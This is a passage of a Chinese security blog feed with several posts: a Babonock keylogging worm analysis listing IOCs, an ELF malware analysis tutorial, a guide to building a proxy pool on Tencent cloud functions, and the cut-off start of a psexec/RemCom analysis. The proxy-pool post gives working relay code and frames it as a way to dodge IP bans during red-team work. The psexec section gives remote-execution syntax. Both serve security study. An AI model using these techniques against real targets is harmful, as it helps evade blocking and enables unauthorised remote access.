class="hljs-number">5</span>)<br>btn_vt = Button(win, text=<span class="hljs-string">&#x27;访问微步&#x27;</span>, command=TBOpen).grid(row=<span class="hljs-number">11</span>, column=<span class="hljs-number">6</span>, rowspan=<span class="hljs-number">2</span>)<br><br>win.mainloop()<br></code></pre></td></tr></table></figure><p>使用pyinstaller打包成exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pyinstaller -i *.ico -F -c main.py --noconsole<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>刚开始接触使用起来还算可以，就是画界面太麻烦了</p><p>工具还有很大的完善空间，加入各种api</p><p>like <a href="https://github.com/alexandreborges/malwoverview">https://github.com/alexandreborges/malwoverview</a></p><p>还有就是python打包exe是真的大</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python,Tkinter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Babonock蠕虫分析</title>
    <link href="/2022/07/26/Babonock%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/"/>
    <url>/2022/07/26/Babonock%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h3><table><thead><tr><th>文件名</th><th>山西***有限公司-2017-1104.exe</th></tr></thead><tbody><tr><td>MD5</td><td>2EB5D76180CE7B3241B281FA79AB3483</td></tr><tr><td>SHA1</td><td>06293DEA80E39C7EB7EE2BDB00D60B58D932FA8A</td></tr><tr><td>CRC32</td><td>541BE22A</td></tr><tr><td>文件大小</td><td>680,511字节</td></tr><tr><td>病毒类型</td><td>Trojan.Win32.Hesv.cmsm</td></tr></tbody></table><img src="image-20220725152859433.png" alt="image-20220725152859433" style="zoom:67%;" /><img src="image-20220725152951242.png" alt="image-20220725152951242" style="zoom:50%;" /><p>由此可知，该病毒由AutoIt3编写</p><h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p> 使用火绒剑进行行为监控发现：</p><p>样本运行后，会将自身复制到%USERPROFILE%\AppData\Microsoft\Office\rundll32.exe；并修改注册表，实现自启动和隐藏文件及文件后缀名；创建mspoint.pip文件记录键盘行为；连接185.27.134.11:21。</p><img src="image-20220725155204126.png" alt="image-20220725155204126" style="zoom: 50%;" /><img src="image-20220725155238538.png" alt="image-20220725155238538" style="zoom:50%;" /><h3 id="AutoIt脚本分析"><a href="#AutoIt脚本分析" class="headerlink" title="AutoIt脚本分析"></a>AutoIt脚本分析</h3><p>使用<em><strong>Autoit3 Decompiler</strong></em>提取出样本的源码</p><img src="image-20220725162050764.png" alt="image-20220725162050764" style="zoom:50%;" /><p>创建同名文件夹并打开，执行install方法</p><img src="image-20220725162203200.png" alt="image-20220725162203200" style="zoom:50%;" /><p>copy方法，复制自身到rundll32.exe,修改注册表，执行子进程并退出主进程</p><img src="image-20220725162333171.png" alt="image-20220725162333171" style="zoom:50%;" /><p>install方法，修改注册表，复制执行rundll32.exe</p><img src="image-20220725162613036.png" alt="image-20220725162613036" style="zoom:50%;" /><p>FTP信息，获取可移动驱动器</p><img src="image-20220725162843206.png" alt="image-20220725162843206" style="zoom:50%;" /><p>键盘钩子</p><img src="image-20220725163111523.png" alt="image-20220725163111523" style="zoom:50%;" /><p>FTP上传mspoint.pip</p><img src="image-20220725163555370.png" alt="image-20220725163555370" style="zoom:50%;" /><p>更新病毒</p><img src="image-20220725163641427.png" alt="image-20220725163641427" style="zoom:50%;" /><p>复制到新的可移动驱动器</p><img src="image-20220725163715821.png" alt="image-20220725163715821" style="zoom:50%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该样本属于Babonock网络蠕虫，是一种通过将自身复制到可移动驱动器而传播的蠕虫,会窃取受感染计算机的键盘输入信息，并通过ftp协议传送到ftp.byethost10.com。</p><img src="image-20220725164120925.png" alt="image-20220725164120925" style="zoom:50%;" /><h3 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h3><p>2EB5D76180CE7B3241B281FA79AB3483</p><p>ftp.byethost10.com</p><p>185.27.134.11</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Babonock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ELF恶意程序分析</title>
    <link href="/2022/06/30/ELF%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/30/ELF%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>网上关于ELF病毒分析的资料太难找了，也很不成体系，其实也能理解，毕竟linux系统占有量太少了，市面上还是windows偏多。自己总结一下省的下次手足无措</p><h2 id="ELF文件介绍"><a href="#ELF文件介绍" class="headerlink" title="ELF文件介绍"></a>ELF文件介绍</h2><p>可执行与可链接格式 (Executable and Linkable Format，ELF)，常被称为ELF格式，是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件的文件格式，ELF目前已经成为UNIX和类UNIX操作系统(比如Linux，MacOS等)的标准二进制格式。ELF格式灵活性高、可扩展，并且跨平台。</p><h3 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h3><p>ELF文件类型主要有：可重定位文件、可执行文件、共享目标文件。</p><ul><li><p>可重定位文件：文件保存着代码和适当的数据，用来和其他的目标文件一起来创建一个可执行文件或者是一个共享目标文件。比如编译的中间产物<code>.o</code>文件</p><img src="REL.png" alt="REL" style="zoom: 67%;" /></li><li><p>可执行文件：包含二进制代码和数据，其形式可以被直接复制到内存并执行。</p><img src="EXEC.png" alt="EXEC" style="zoom:67%;" /></li><li><p>共享目标文件：共享库。文件保存着代码和合适的数据，用来被下连接编辑器和动态链接器链接。比如linux下的<code>.so</code>文件。</p></li></ul><img src="DYN.png" alt="DYN" style="zoom:67%;" /><p>其实还有一种core文件，也属于ELF文件，在core dumped时可以得到。</p><p>同时还可以使用<strong>file</strong>命令来查看文件的属性</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ file abs<br>abs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=3ca00e6283cee848914a5dc39b6c141ca8c77e5a, stripped<br></code></pre></td></tr></table></figure><h3 id="ELF文件组成"><a href="#ELF文件组成" class="headerlink" title="ELF文件组成"></a>ELF文件组成</h3><img src="image-20220628133004410.png" alt="image-20220628133004410" style="zoom:50%;" /><p>因为ELF格式需要使用在两种场合：一种是组成可重定位文件，以参与可执行文件或者共享目标文件的链接构建； 另一种是组成可执行文件或者共享目标文件，以在运行时内存中进程映像的构建。所以存在两种视图，链接视图和执行视图。</p><p>图中左边的部分表示的是可重定位文件的链接视图；而右边部分表示的则是可执行文件以及共享目标文件的执行视图。</p><p>总的ELF文件可以分为四个部分：</p><table><thead><tr><th align="left">ELF header</th><th>描述整个文件的组织，如: 版本信息，入口信息，偏移信息等。</th></tr></thead><tbody><tr><td align="left">Program Header Table</td><td>描述文件中的各种Segments，用来告诉系统如何创建进程的内存映像。</td></tr><tr><td align="left">Section 或者 Segment</td><td>Section描述了链接过程中的需要的符号表、数据、指令等信息，而在可执行文件中是Segment，是经过合并的Seciton，描述了可执行文件的内存布局以及如何映射到内存中。</td></tr><tr><td align="left">Section Header Table</td><td>描述文件Sections的信息，比如大小、偏移等。</td></tr></tbody></table><p>也就是说，在链接阶段，我们可以忽略program header table来处理文件；在运行阶段，可以忽略section header table来处理此程序。</p><img src="image-20220628143411794.png" alt="image-20220628143411794" style="zoom:50%;" /><p>如果用于编译和链接（可重定位文件），则编译器和链接器将把ELF文件看作是节头表描述的节的集合，程序头表可选。<br>如果用于加载执行（可执行文件），则加载器则将把ELF文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头部表可选。<br>如果是共享目标文件，则两者都含有。因为链接器在链接的时候需要节头部表来查看目标文件各个section的信息然后对各个目标文件进行链接；而加载器在加载可执行程序的时候需要程序头表，它需要根据这个表把相应的段加载到进程自己的虚拟内存（虚拟地址空间）中。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">Segment</span>和<span class="hljs-meta">Section</span>的区别：<br>- <span class="hljs-meta">Segment</span>包含了程序装载可执行的基本信息，<span class="hljs-meta">Segment</span>告诉系统如何装载当前<span class="hljs-meta">Segment</span>到虚拟内存以及当前<span class="hljs-meta">Segment</span>的权限等和执行相关的信息，一个<span class="hljs-meta">Segment</span>可以包含零个或多个<span class="hljs-meta">Section</span>；<br>- <span class="hljs-meta">Section</span>包含了程序的代码和数据等内容，链接器会将多个<span class="hljs-meta">Section</span>合并为一个<span class="hljs-meta">Segment</span>。<br></code></pre></td></tr></table></figure><p>简单了解到此为止，ELF文件结构还是很值得深入学习的</p><h2 id="ELF恶意程序分析方法"><a href="#ELF恶意程序分析方法" class="headerlink" title="ELF恶意程序分析方法"></a>ELF恶意程序分析方法</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>在分析ELF恶意程序前，我们需要尽可能多的掌握恶意代码的基本情况，才能便于我们选择合适的分析环境，采用适当的分析方法进行分析。<br>在Linux系统中，提供了多种命令辅助我们对Linux恶意程序进行静态分析，如下表</p><table><thead><tr><th>工具</th><th>功能</th></tr></thead><tbody><tr><td>readelf</td><td>用于查看ELF格式的文件信息</td></tr><tr><td>file</td><td>用于辨识文件类型</td></tr><tr><td>objdump</td><td>以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息</td></tr><tr><td>ldd</td><td>列出一个程序所需要得动态链接库</td></tr><tr><td>hexdump</td><td>hexdump主要用来查看“二进制”文件的十六进制编码</td></tr><tr><td>strings</td><td>列出目标文件中所有可打印的字符串</td></tr><tr><td>ar</td><td>创建静态库，插入&#x2F;删除&#x2F;列出&#x2F;提取 成员函数</td></tr><tr><td>nm</td><td>列出目标文件中符号表所定义的符号</td></tr><tr><td>strip</td><td>从目标文件中删除符号表的信息</td></tr><tr><td>size</td><td>列出目标文件中各个段的大小</td></tr></tbody></table><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><table><thead><tr><th>工具</th><th>功能</th></tr></thead><tbody><tr><td>strace</td><td>一个功能强大的调试、分析、诊断工具，跟踪程序或进程执行时的系统调用和所接收的信号</td></tr><tr><td>ltrace</td><td>库文件调用跟踪器，跟踪进程调用库函数的情况，用法类似strace</td></tr><tr><td>ftrace</td><td>ftrace包含一系列跟踪器，用于不同的场合，比如跟踪内核函数调用(function tracer)、跟踪上下文切换(sched_switch tracer)、查看中断被关闭的时长(irqsoff tracer)、跟踪内核中的延迟以及性能问题等。</td></tr><tr><td>ptrace</td><td>进程跟踪器，类似于gdb watch的调试方法</td></tr><tr><td>sysrq</td><td>是内建于Linux内核的调试工具，可以搜集包括系统内存使用、CPU任务处理、进程运行状态等系统运行信息。</td></tr></tbody></table><p>strace跟踪hello word程序，可以看到程序调用write()做了输出</p><img src="strace.png" alt="strace" style="zoom:67%;" /><p>ltrace跟踪hello word程序</p><p><img src="/2022/06/30/ELF%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20220629110615608.png" alt="image-20220629110615608"></p><p>源代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc hello.c -fno-builtin -o hello --verbose<br></code></pre></td></tr></table></figure><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><h4 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h4><p>在Linux中调试样本，最常见的调试方法就是使用GDB进行调试。</p><p>GDB 是GNU提供的一款命令行调试器，有用强大的调试功能，并且对于含有调试符号的程序支持源码级调试，同时支持使用Python语言编写拓展，一般用到的扩展插件为gdb-peda、gef或pwndbg。</p><p>常用命令：</p><table><thead><tr><th>命令名称</th><th>命令缩写</th><th>命令说明</th></tr></thead><tbody><tr><td>run</td><td>r</td><td>运行一个待调试的程序</td></tr><tr><td>continue</td><td>c</td><td>让暂停的程序继续运行</td></tr><tr><td>next</td><td>n</td><td>运行到下一行</td></tr><tr><td>step</td><td>s</td><td>单步执行，遇到函数会进入</td></tr><tr><td>until</td><td>u</td><td>运行到指定行停下来</td></tr><tr><td>finish</td><td>fi</td><td>结束当前调用函数，回到上一层调用函数处</td></tr><tr><td>return</td><td>return</td><td>结束当前调用函数并返回指定值，到上一层函数调用处</td></tr><tr><td>jump</td><td>j</td><td>将当前程序执行流跳转到指定行或地址</td></tr><tr><td>print</td><td>p</td><td>打印变量或寄存器值</td></tr><tr><td>backtrace</td><td>bt</td><td>查看当前线程的调用堆栈</td></tr><tr><td>frame</td><td>f</td><td>切换到当前调用线程的指定堆栈</td></tr><tr><td>thread</td><td>thread</td><td>切换到指定线程</td></tr><tr><td>break</td><td>b</td><td>添加断点</td></tr><tr><td>tbreak</td><td>tb</td><td>添加临时断点</td></tr><tr><td>delete</td><td>d</td><td>删除断点</td></tr><tr><td>enable</td><td>enable</td><td>启用某个断点</td></tr><tr><td>disable</td><td>disable</td><td>禁用某个断点</td></tr><tr><td>watch</td><td>watch</td><td>监视某一个变量或内存地址的值是否发生变化</td></tr><tr><td>list</td><td>l</td><td>显示源码</td></tr><tr><td>info</td><td>i</td><td>查看断点 &#x2F; 线程等信息</td></tr><tr><td>ptype</td><td>ptype</td><td>查看变量类型</td></tr><tr><td>disassemble</td><td>dis</td><td>查看汇编代码</td></tr><tr><td>set args</td><td>set args</td><td>设置程序启动命令行参数</td></tr><tr><td>show args</td><td>show args</td><td>查看设置的命令行参数</td></tr></tbody></table><img src="gdb.png" alt="gdb" style="zoom:50%;" /><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gdb</span>  要调试的elf<br></code></pre></td></tr></table></figure><p>使用layout asm，分割窗口并显示汇编窗口</p><img src="image-20220629162309047.png" alt="image-20220629162309047" style="zoom: 67%;" /><h4 id="IDA远程调试"><a href="#IDA远程调试" class="headerlink" title="IDA远程调试"></a>IDA远程调试</h4><p>我更偏向于使用IDA远程调试，它比使用GDB调试更简单方便，分析效率更高。</p><p>将IDA pro安装目录下dbgsrv文件夹内的linux_server或者linux_server64拷贝到linux虚拟机中，并执行</p><img src="image-20220629145013410.png" alt="image-20220629145013410" style="zoom:67%;" /><p>使用IDA pro打开要调试的程序(例如：abs)，选择Remote Linux debugger</p><p><img src="/2022/06/30/ELF%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20220629145456866.png" alt="image-20220629145456866"></p><p>在调试器-进程设置…中，设置各种参数(调试文件路径，远程Linux虚拟机的ip地址及端口)</p><img src="image-20220629145902283.png" alt="image-20220629145902283" style="zoom:67%;" /><p>然后在IDA pro适当位置中设置断点，F9开始调试</p><img src="image-20220629150315933.png" alt="image-20220629150315933" style="zoom: 67%;" /><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/213433">https://www.anquanke.com/post/id/213433</a></p><p><a href="https://refspecs.linuxbase.org/elf/elf.pdf">https://refspecs.linuxbase.org/elf/elf.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ELF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用腾讯云函数(SCF)搭建免费代理池</title>
    <link href="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
    <url>/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
    
    <content type="html"><![CDATA[<p>以前曾经用过<a href="https://github.com/jhao104/proxy_pool">proxy_pool</a>搭过代理池，但是大部分爬来的代理都不怎么好用就果断放弃了</p><p>最近看使用一篇文章感觉挺靠谱的，也临近HVV，就自己搭着试了试，效果也不错</p><p><a href="https://blog.csdn.net/qq_45244158/article/details/122945753">https://blog.csdn.net/qq_45244158/article/details/122945753</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数（Serverless Cloud Function，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。<br>无服务器（Serverless）不是表示没有服务器，而表示在使用 Serverless 时，我们无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。使用云函数（SCF）时，我们只需使用平台支持的语言（Python、Node.js、PHP、Golang、Java 及 Custom Runtime）编写代码，云计算厂商将完全管理底层计算资源，包括服务器 CPU、内存、网络和其他配置&#x2F;资源维护、代码部署、弹性伸缩、负载均衡、安全升级、资源运行情况监控等。总结云函数的三个特性就是：</p><ol><li>多出口</li><li>调用时创建执行</li><li>无需服务器承载</li></ol><h3 id="代理池的构建原理"><a href="#代理池的构建原理" class="headerlink" title="代理池的构建原理"></a>代理池的构建原理</h3><p>云函数（SCF）可通过 API 网关触发器进行触发，接受来自客户端的数据，并将请求转发出去。也就是说利用云厂商提供的云函数（函数计算）功能，将客户端的HTTP请求转发，由于云函数拥有非常多的出口IP，也就不怕封IP了</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/%E6%B5%81%E9%87%8F%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="流量示意图"></p><h2 id="搭建socks5代理池"><a href="#搭建socks5代理池" class="headerlink" title="搭建socks5代理池"></a><strong>搭建socks5代理池</strong></h2><p>项目地址<a href="https://github.com/culprits/SCFProxy">https://github.com/culprits/SCFProxy</a></p><h3 id="云函数函数配置"><a href="#云函数函数配置" class="headerlink" title="云函数函数配置"></a>云函数函数配置</h3><p>登录 <a href="https://console.cloud.tencent.com/scf/list">腾讯云函数服务</a>，新建云函数</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100034803.png" alt="image-20220623100034803"></p><p>选择在线编辑，粘贴代码\SOCKS5\src\server.py的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> select<br><br><br>bridge_ip = <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-comment">#vps IP</span><br>bridge_port = <span class="hljs-number">1234</span>                  <span class="hljs-comment">#vps开启监听的端口</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_handler</span>(<span class="hljs-params">event, context</span>):<br>    data = json.loads(event[<span class="hljs-string">&quot;body&quot;</span>])<br>    out = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    out.connect((data[<span class="hljs-string">&quot;host&quot;</span>], data[<span class="hljs-string">&quot;port&quot;</span>]))<br><br>    bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    bridge.connect((bridge_ip, bridge_port))<br>    bridge.send(data[<span class="hljs-string">&quot;uid&quot;</span>].encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select.select([out, bridge], [], [])<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">in</span> readable:<br>            data = out.recv(<span class="hljs-number">4096</span>)<br>            bridge.send(data)<br>        <span class="hljs-keyword">if</span> bridge <span class="hljs-keyword">in</span> readable:<br>            data = bridge.recv(<span class="hljs-number">4096</span>)<br>            out.send(data)<br></code></pre></td></tr></table></figure><p>点击完成，在函数管理-函数配置中将执行超时时间改为最大900，即一个SOCKS5长连接最多维持15min</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100450988.png" alt="image-20220623100450988"></p><p>创建触发器，触发方式为API网关触发</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100749983.png" alt="image-20220623100749983"></p><p>复制访问路径备用</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100915281.png" alt="image-20220623100915281"></p><h3 id="VPS服务端配置"><a href="#VPS服务端配置" class="headerlink" title="VPS服务端配置"></a>VPS服务端配置</h3><p>注：其实可以不使用vps服务端，直接调用云函数实现代理，但是我正好有vps而且这样还挺方便就没有研究这个方向，没有vps的伙伴可以研究一下</p><p>需要环境：要求 Python &gt;&#x3D; 3.8</p><p>我的vps正好是CentOS 7 默认的python版本是python2.7.5，就顺带装了一下python3.8.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">依赖包</span><br>yum -y groupinstall &quot;Development tools&quot;<br> <br>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载 Python3</span><br>wget https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建文件夹</span><br>mkdir /usr/local/python3 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">解压编译安装</span><br>tar -xvJf  Python-3.8.1.tar.xz<br>cd Python-3.8.1<br>./configure --prefix=/usr/local/python3<br>make &amp;&amp; make install<br><span class="hljs-meta prompt_">#</span><span class="language-bash">给个软链</span><br>ln -s /usr/local/python3/bin/python3 /usr/bin/python3<br>ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3<br></code></pre></td></tr></table></figure><p>将socks_client文件夹，包含requirements.txt，上传到vps上</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623102324382.png" alt="image-20220623102324382"></p><p>执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv .venv<br>source .venv/bin/activate<br>pip3 install -r requirements.txt<br><br>在后台执行<br>screen python3 socks5.py -u &quot;API访问路径&quot; -bp 监听端口 -sp socks端口 --user 用户名 --passwd 密码<br></code></pre></td></tr></table></figure><p>打开上面两个端口的防火墙，包括vps防火墙以及vps服务商的防火墙设置</p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>下载Proxifier代理软件，内网渗透、流量代理良品</p><p><em>我使用的是<a href="https://www.litiaotiao.com/proxifier.html">https://www.litiaotiao.com/proxifier.html</a></em>，<strong>推荐正版，小心病毒</strong></p><p>在配置文件-代理服务器，填写vps地址、端口、协议Socks5、用户名及密码</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623103106679.png" alt="image-20220623103106679"></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="image-20220623103332665.png" alt="image-20220623103332665" style="zoom:80%;" /><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>等vps过期不续费了，研究一下无vps代理，目前为至这个还很好用，谢谢大佬</p><p>另外，腾讯云函数要开始收费了，是不是要改战<a href="https://www.huaweicloud.com/product/functiongraph.html">华为云函数工作流</a>，函数前100万次&#x2F;月调用免费</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理池</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>psexec生成的RemCom木马分析</title>
    <link href="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="psexec介绍"><a href="#psexec介绍" class="headerlink" title="psexec介绍"></a>psexec介绍</h2><p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a> 是用于处理网络协议的Python类的集合,该集合包含了渗透测试中常见的工具种类,包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。</p><p>工具描述详见<a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p><p>psexec.py 是impacket套件中进行远程连接，执行shell命令，并返回处理输出结果的命令行工具。</p><p>原理：通过smb协议上传一个服务程序（RemCom）到C:\Windows（ADMIN$）目录下，服务程序通过管道进行后续命令执行的输入输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python psexec.py     //查看帮助<br></code></pre></td></tr></table></figure><img src="image-20220616150341207.png" alt="image-20220616150341207" style="zoom: 80%;" /><p>语法:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">python psexec.py  <span class="hljs-comment">[<span class="hljs-comment">[domain/]</span>username<span class="hljs-comment">[:password]</span>@]</span>&lt;targetName or address&gt;<br></code></pre></td></tr></table></figure><p>例如：</p><img src="image-20220616152838197.png" alt="image-20220616152838197" style="zoom:80%;" /><p>脚本默认的编码是utf-8，而window操作系统默认编码格式是gbk，所以防止出现乱码可以使用 <em>-codec 